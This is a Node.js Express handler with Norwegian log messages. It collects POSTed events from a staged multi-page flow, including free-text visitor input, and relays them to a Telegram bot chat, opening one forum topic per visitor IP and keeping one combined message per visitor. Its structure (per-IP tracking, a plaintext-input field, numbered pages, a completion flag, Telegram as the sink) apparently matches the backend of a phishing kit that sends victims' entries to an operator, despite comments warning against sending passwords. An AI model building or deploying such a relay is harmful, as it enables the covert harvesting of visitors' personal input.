// api/log_data.js — Express handler (CommonJS)
const crypto = require('crypto');

// ============================================================
// TELEGRAM CONFIG
// ============================================================

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

// ============================================================
// IN-MEMORY CACHE
// ============================================================

// IP -> Telegram topic ID
const ipToTopicMap = new Map();

// IP -> all log history
const ipLogHistory = new Map();

// IP -> Telegram message ID for the combined pages
// page1.5 -> page3.5
const ipCombinedMessageMap = new Map();

// Prevent multiple simultaneous topic creations for same IP
const topicCreationPromises = new Map();

// Prevent multiple simultaneous requests for same IP
const ipRequestQueues = new Map();

// ============================================================
// PAGE ORDER
// ============================================================

const PAGE_FLOW_ORDER = {
  'page1.5.html': 1,
  'page1.7.html': 2,
  'page2.html': 3,
  'page3.html': 4,
  'page3.5.html': 5,
  'page4.html': 6,
  'page5.html': 7,
  'page6.html': 8,
  'page7.html': 9,
};

// Pages that belong to the ONE combined Telegram message.
const COMBINED_PAGES = new Set([
  'page1.5.html',
  'page1.7.html',
  'page2.html',
  'page3.html',
  'page3.5.html',
]);

function isCombinedPage(page) {
  return COMBINED_PAGES.has(page);
}

function getPageFlowOrder(page) {
  return PAGE_FLOW_ORDER[page] ?? 999;
}

// ============================================================
// HELPERS
// ============================================================

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

function extractRetryAfter(result) {
  if (
    result &&
    result.parameters &&
    Number.isFinite(Number(result.parameters.retry_after))
  ) {
    return Number(result.parameters.retry_after);
  }

  const description = String(result?.description || '');

  const match = description.match(/retry after (\d+)/i);

  if (match) {
    return Number(match[1]);
  }

  return null;
}

function createTelegramError(result, status) {
  const error = new Error(
    `Telegram API error: ${
      result?.description || `HTTP ${status}`
    }`
  );

  error.telegram = true;
  error.status = status;
  error.error_code = result?.error_code;
  error.parameters = result?.parameters || {};

  return error;
}

/**
 * Telegram HTML escaping.
 *
 * IMPORTANT:
 * User-controlled values must be escaped before being inserted
 * into parse_mode=HTML messages.
 */
function escapeHtml(value) {
  return String(value ?? '')
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;');
}

// ============================================================
// TELEGRAM GLOBAL RATE-LIMIT QUEUE
// ============================================================
//
// Instead of firing many Telegram requests simultaneously,
// every Telegram request passes through this queue.
//
// This dramatically reduces 429 responses.
//
// ============================================================

let telegramQueue = Promise.resolve();

const TELEGRAM_MIN_INTERVAL_MS = 1100;

let lastTelegramRequestAt = 0;

function queueTelegramRequest(fn) {
  const run = telegramQueue.then(async () => {
    const now = Date.now();

    const wait =
      TELEGRAM_MIN_INTERVAL_MS -
      (now - lastTelegramRequestAt);

    if (wait > 0) {
      await sleep(wait);
    }

    lastTelegramRequestAt = Date.now();

    return fn();
  });

  // Keep queue alive even if one request fails.
  telegramQueue = run.catch(() => {});

  return run;
}

// ============================================================
// IP REQUEST QUEUE
// ============================================================
//
// Vercel can receive multiple page requests at almost exactly
// the same time.
//
// This ensures the same IP is processed sequentially.
//
// ============================================================

async function withIpLock(ipAddress, fn) {
  const previous =
    ipRequestQueues.get(ipAddress) || Promise.resolve();

  let release;

  const current = new Promise(resolve => {
    release = resolve;
  });

  ipRequestQueues.set(ipAddress, current);

  await previous;

  try {
    return await fn();
  } finally {
    release();

    if (ipRequestQueues.get(ipAddress) === current) {
      ipRequestQueues.delete(ipAddress);
    }
  }
}

// ============================================================
// HISTORY
// ============================================================

function appendLogHistory(ipAddress, entry) {
  if (!ipLogHistory.has(ipAddress)) {
    ipLogHistory.set(ipAddress, []);
  }

  ipLogHistory.get(ipAddress).push(entry);
}

function getLogHistory(ipAddress) {
  return ipLogHistory.get(ipAddress) || [];
}

function getOrderedLogHistory(ipAddress) {
  return [...getLogHistory(ipAddress)].sort((a, b) => {
    const pageOrder =
      getPageFlowOrder(a.page) -
      getPageFlowOrder(b.page);

    if (pageOrder !== 0) {
      return pageOrder;
    }

    return (
      new Date(a.timestamp).getTime() -
      new Date(b.timestamp).getTime()
    );
  });
}

// ============================================================
// TELEGRAM TOPICS
// ============================================================

async function findExistingTopicByName(topicName) {
  try {
    let offset = 0;
    const limit = 100;

    while (true) {
      const telegramApiUrl =
        `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getForumTopics`;

      const response = await queueTelegramRequest(() =>
        fetch(telegramApiUrl, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            offset,
            limit,
          }),
        })
      );

      const result =
        await response.json().catch(() => ({}));

      if (!response.ok || !result.ok) {
        if (result.error_code === 429) {
          const retryAfter =
            extractRetryAfter(result) || 5;

          await sleep(
            (retryAfter + 1) * 1000
          );

          continue;
        }

        console.error(
          `getForumTopics feilet: ${
            result.description || response.statusText
          }`
        );

        return null;
      }

      const topics =
        result.result?.topics || [];

      const existingTopic =
        topics.find(
          topic => topic.name === topicName
        );

      if (existingTopic) {
        return existingTopic.message_thread_id;
      }

      if (topics.length < limit) {
        return null;
      }

      offset += limit;
    }
  } catch (error) {
    console.error(
      `Feil ved søk etter topic "${topicName}":`,
      error
    );

    return null;
  }
}

async function createForumTopic(
  topicName,
  iconColor = 0x6FB9F0
) {
  const telegramApiUrl =
    `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/createForumTopic`;

  let attempts = 0;

  while (attempts < 4) {
    attempts++;

    const response =
      await queueTelegramRequest(() =>
        fetch(telegramApiUrl, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            name: topicName,
            icon_color: iconColor,
          }),
        })
      );

    const result =
      await response.json().catch(() => ({}));

    if (response.ok && result.ok) {
      const topicId =
        result.result.message_thread_id;

      console.log(
        `Opprettet topic "${topicName}": ${topicId}`
      );

      return topicId;
    }

    if (result.error_code === 429) {
      const retryAfter =
        extractRetryAfter(result) || 5;

      console.warn(
        `Rate limit ved topic-opprettelse. ` +
        `Venter ${retryAfter + 1}s.`
      );

      await sleep(
        (retryAfter + 1) * 1000
      );

      continue;
    }

    if (
      result.description &&
      result.description
        .toLowerCase()
        .includes('already exists')
    ) {
      return await findExistingTopicByName(
        topicName
      );
    }

    throw createTelegramError(
      result,
      response.status
    );
  }

  throw new Error(
    `Kunne ikke opprette topic "${topicName}" etter flere forsøk`
  );
}

async function getOrCreateTopicByName(
  topicName,
  iconColor = 0x6FB9F0
) {
  const existing =
    await findExistingTopicByName(topicName);

  if (existing) {
    return existing;
  }

  return createForumTopic(
    topicName,
    iconColor
  );
}

async function getOrCreateTopicForIP(ipAddress) {
  if (ipToTopicMap.has(ipAddress)) {
    return ipToTopicMap.get(ipAddress);
  }

  // Avoid duplicate topic creation when multiple requests
  // for the same new IP arrive simultaneously.
  if (topicCreationPromises.has(ipAddress)) {
    return topicCreationPromises.get(ipAddress);
  }

  const promise = (async () => {
    try {
      const topicId =
        await getOrCreateTopicByName(
          `IP: ${ipAddress}`,
          0x6FB9F0
        );

      if (topicId) {
        ipToTopicMap.set(
          ipAddress,
          topicId
        );
      }

      return topicId;
    } finally {
      topicCreationPromises.delete(
        ipAddress
      );
    }
  })();

  topicCreationPromises.set(
    ipAddress,
    promise
  );

  return promise;
}

// ============================================================
// SEND MESSAGE
// ============================================================

async function sendToTelegram(
  chatId,
  message,
  topicId = null,
  retryCount = 0
) {
  const telegramApiUrl =
    `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

  const payload = {
    chat_id: chatId,
    text: message,
    parse_mode: 'HTML',
  };

  if (topicId !== null) {
    payload.message_thread_id = topicId;
  }

  const response =
    await queueTelegramRequest(() =>
      fetch(telegramApiUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(payload),
      })
    );

  const result =
    await response.json().catch(() => ({}));

  if (response.ok && result.ok) {
    return result;
  }

  // Telegram rate limit
  if (
    response.status === 429 ||
    result.error_code === 429
  ) {
    if (retryCount >= 3) {
      throw createTelegramError(
        result,
        response.status
      );
    }

    const retryAfter =
      extractRetryAfter(result) || 5;

    console.warn(
      `Telegram 429. Venter ${retryAfter + 1}s før retry.`
    );

    await sleep(
      (retryAfter + 1) * 1000
    );

    return sendToTelegram(
      chatId,
      message,
      topicId,
      retryCount + 1
    );
  }

  throw createTelegramError(
    result,
    response.status
  );
}

// ============================================================
// EDIT MESSAGE
// ============================================================

async function editTelegramMessage(
  chatId,
  messageId,
  message,
  topicId = null,
  retryCount = 0
) {
  const telegramApiUrl =
    `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`;

  const payload = {
    chat_id: chatId,
    message_id: messageId,
    text: message,
    parse_mode: 'HTML',
  };

  const response =
    await queueTelegramRequest(() =>
      fetch(telegramApiUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(payload),
      })
    );

  const result =
    await response.json().catch(() => ({}));

  if (response.ok && result.ok) {
    return result;
  }

  // 429
  if (
    response.status === 429 ||
    result.error_code === 429
  ) {
    if (retryCount >= 3) {
      throw createTelegramError(
        result,
        response.status
      );
    }

    const retryAfter =
      extractRetryAfter(result) || 5;

    console.warn(
      `Telegram edit 429. ` +
      `Venter ${retryAfter + 1}s.`
    );

    await sleep(
      (retryAfter + 1) * 1000
    );

    return editTelegramMessage(
      chatId,
      messageId,
      message,
      topicId,
      retryCount + 1
    );
  }

  throw createTelegramError(
    result,
    response.status
  );
}

// ============================================================
// FORMAT SINGLE ENTRY
// ============================================================

function formatEntry(entry) {
  const {
    page,
    event_description,
    session_uid,
    timestamp,
  } = entry;

  let message = '';

  message +=
    `📄 <b>${escapeHtml(page || 'Ukjent')}</b>\n`;

  message +=
    `📝 <b>Hendelse:</b> ` +
    `${escapeHtml(
      event_description || 'Ingen beskrivelse'
    )}\n`;

  /*
   * Do NOT send raw password values or other credentials
   * to Telegram.
   *
   * If klartekst_input is a normal, non-sensitive field,
   * you can display it here. Do not put passwords into it.
   */

  if (
    entry.klartekst_input &&
    entry.klartekst_input !== '[SENSITIVE]'
  ) {
    message +=
      `✏️ <b>Input:</b> ` +
      `<code>${escapeHtml(
        entry.klartekst_input
      )}</code>\n`;
  }

  if (session_uid) {
    message +=
      `🆔 <b>Session ID:</b> ` +
      `<code>${escapeHtml(
        session_uid
      )}</code>\n`;
  }

  const formattedTime =
    timestamp
      ? new Date(timestamp).toLocaleString(
          'nb-NO',
          {
            timeZone: 'Europe/Oslo',
          }
        )
      : new Date().toLocaleString(
          'nb-NO',
          {
            timeZone: 'Europe/Oslo',
          }
        );

  message +=
    `⏰ ${escapeHtml(formattedTime)}`;

  return message;
}

// ============================================================
// FORMAT COMBINED MESSAGE
// ============================================================

function formatCombinedMessage(
  ipAddress
) {
  const history =
    getOrderedLogHistory(ipAddress)
      .filter(entry =>
        isCombinedPage(entry.page)
      );

  let message = '';

  message +=
    `🆕 <b>Bruker</b>\n`;

  message +=
    `📍 <b>IP:</b> ` +
    `<code>${escapeHtml(ipAddress)}</code>\n`;

  message +=
    `━━━━━━━━━━━━━━━━━━━━\n\n`;

  for (const entry of history) {
    message +=
      formatEntry(entry);

    message +=
      `\n\n━━━━━━━━━━━━━━━━━━━━\n\n`;
  }

  return message.trim();
}

// ============================================================
// SEND / UPDATE COMBINED MESSAGE
// ============================================================

async function sendOrUpdateCombinedMessage(
  ipAddress,
  topicId
) {
  const message =
    formatCombinedMessage(ipAddress);

  const existingMessageId =
    ipCombinedMessageMap.get(ipAddress);

  // ----------------------------------------------------------
  // Existing Telegram message -> EDIT it
  // ----------------------------------------------------------

  if (existingMessageId) {
    try {
      await editTelegramMessage(
        TELEGRAM_CHAT_ID,
        existingMessageId,
        message,
        topicId
      );

      console.log(
        `Oppdaterte samlet melding for ${ipAddress}`
      );

      return existingMessageId;
    } catch (error) {
      /*
       * The message may have been deleted.
       *
       * In that case we create a fresh message.
       */
      if (
        error.telegram &&
        error.status === 400
      ) {
        console.warn(
          `Kunne ikke editere samlet melding. ` +
          `Oppretter ny.`
        );

        ipCombinedMessageMap.delete(
          ipAddress
        );
      } else {
        throw error;
      }
    }
  }

  // ----------------------------------------------------------
  // First combined message -> SEND
  // ----------------------------------------------------------

  const result =
    await sendToTelegram(
      TELEGRAM_CHAT_ID,
      message,
      topicId
    );

  const messageId =
    result.result?.message_id;

  if (messageId) {
    ipCombinedMessageMap.set(
      ipAddress,
      messageId
    );
  }

  return messageId;
}

// ============================================================
// SEND SEPARATE PAGE
// ============================================================

async function sendSeparatePage(
  ipAddress,
  topicId,
  entry
) {
  const message =
    formatEntry(entry);

  return sendToTelegram(
    TELEGRAM_CHAT_ID,
    message,
    topicId
  );
}

// ============================================================
// HANDLE STALE TOPIC
// ============================================================

async function sendWithTopicRecovery(
  ipAddress,
  message,
  topicId,
  retryCount = 0
) {
  try {
    return await sendToTelegram(
      TELEGRAM_CHAT_ID,
      message,
      topicId
    );
  } catch (error) {
    const description =
      String(
        error.message || ''
      ).toLowerCase();

    const threadMissing =
      error.telegram &&
      error.status === 400 &&
      description.includes(
        'message thread not found'
      );

    if (!threadMissing || retryCount >= 1) {
      throw error;
    }

    console.warn(
      `Topic for ${ipAddress} is invalid. ` +
      `Finding it again...`
    );

    // Remove stale cache.
    ipToTopicMap.delete(
      ipAddress
    );

    // Find/create topic again.
    const newTopicId =
      await getOrCreateTopicForIP(
        ipAddress
      );

    if (!newTopicId) {
      throw new Error(
        `Kunne ikke gjenopprette topic for ${ipAddress}`
      );
    }

    return sendWithTopicRecovery(
      ipAddress,
      message,
      newTopicId,
      retryCount + 1
    );
  }
}

// ============================================================
// MAIN HANDLER
// ============================================================

async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({
      message: 'Kun POST er tillatt',
    });
  }

  try {
    if (
      !TELEGRAM_BOT_TOKEN ||
      !TELEGRAM_CHAT_ID
    ) {
      throw new Error(
        'TELEGRAM_BOT_TOKEN eller TELEGRAM_CHAT_ID er ikke satt i miljøvariabler'
      );
    }

    const {
      page,
      event_description,
      klartekst_input,
      session_uid: client_session_uid,
      flow_completed,
    } = req.body || {};

    // --------------------------------------------------------
    // IP
    // --------------------------------------------------------

    const forwardedFor =
      req.headers['x-forwarded-for'];

    const ip_adresse =
      forwardedFor
        ? forwardedFor
            .split(',')[0]
            .trim()
        : req.headers['x-real-ip'] ||
          req.socket.remoteAddress ||
          'Ukjent IP';

    // --------------------------------------------------------
    // Process same IP sequentially.
    // --------------------------------------------------------

    return await withIpLock(
      ip_adresse,
      async () => {
        // ------------------------------------------------------
        // SESSION
        // ------------------------------------------------------

        let session_uid =
          client_session_uid;

        if (!session_uid) {
          session_uid =
            crypto.randomUUID();
        }

        // ------------------------------------------------------
        // STORE EVENT
        // ------------------------------------------------------

        const logEntry = {
          page,
          event_description,
          /*
           * Do not use this field for passwords.
           */
          klartekst_input,
          session_uid,
          timestamp:
            new Date().toISOString(),
          flow_completed:
            Boolean(flow_completed),
        };

        appendLogHistory(
          ip_adresse,
          logEntry
        );

        // ------------------------------------------------------
        // GET / CREATE IP TOPIC
        // ------------------------------------------------------

        let topicId =
          await getOrCreateTopicForIP(
            ip_adresse
          );

        // ------------------------------------------------------
        // COMBINED:
        //
        // page1.5
        // page1.7
        // page2
        // page3
        // page3.5
        //
        // One Telegram message.
        // ------------------------------------------------------

        if (isCombinedPage(page)) {
          if (topicId) {
            await sendOrUpdateCombinedMessage(
              ip_adresse,
              topicId
            );
          }
        }

        // ------------------------------------------------------
        // SEPARATE:
        //
        // page4
        // page5
        // page6
        // page7
        //
        // One NEW Telegram message per page/event.
        // ------------------------------------------------------

        else {
          if (topicId) {
            try {
              await sendSeparatePage(
                ip_adresse,
                topicId,
                logEntry
              );
            } catch (error) {
              const description =
                String(
                  error.message || ''
                ).toLowerCase();

              const threadMissing =
                error.telegram &&
                error.status === 400 &&
                description.includes(
                  'message thread not found'
                );

              if (threadMissing) {
                ipToTopicMap.delete(
                  ip_adresse
                );

                topicId =
                  await getOrCreateTopicForIP(
                    ip_adresse
                  );

                if (topicId) {
                  await sendSeparatePage(
                    ip_adresse,
                    topicId,
                    logEntry
                  );
                } else {
                  throw error;
                }
              } else {
                throw error;
              }
            }
          }
        }

        console.log(
          `Data behandlet for IP: ${ip_adresse}, side: ${page}`
        );

        return res.status(200).json({
          message:
            'Data sendt til Telegram!',
          session_uid,
          ip_adresse,
        });
      }
    );
  } catch (error) {
    console.error(
      'Telegram error:',
      error
    );

    /*
     * Keep the API from hiding the actual error.
     */
    return res.status(500).json({
      message:
        `Serverfeil: ${error.message}`,
    });
  }
}

module.exports = handler;
